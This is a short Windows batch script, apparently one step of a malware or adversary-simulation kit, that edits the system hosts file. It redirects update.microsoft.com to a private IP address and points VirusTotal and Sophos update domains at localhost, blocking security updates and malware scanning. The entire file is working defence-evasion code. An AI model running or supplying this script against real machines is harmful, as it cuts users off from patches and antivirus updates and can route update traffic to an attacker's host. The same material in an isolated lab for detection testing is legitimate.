@ECHO OFF

ECHO ===========================================================================
ECHO HOSTS
ECHO.
ECHO Modifying the hosts file
ping -n 3 127.0.0.1 > NUL

ECHO Adding update.microsoft.com mapping to private IP address
ECHO 10.2.2.2	update.microsoft.com >> %SYSTEMROOT%\System32\drivers\etc\hosts
ECHO 127.0.0.1  www.virustotal.com >> %SYSTEMROOT%\System32\drivers\etc\hosts
ECHO 127.0.0.1  www.www.com >> %SYSTEMROOT%\System32\drivers\etc\hosts
ECHO 127.0.0.1  dci.sophosupd.com >> %SYSTEMROOT%\System32\drivers\etc\hosts
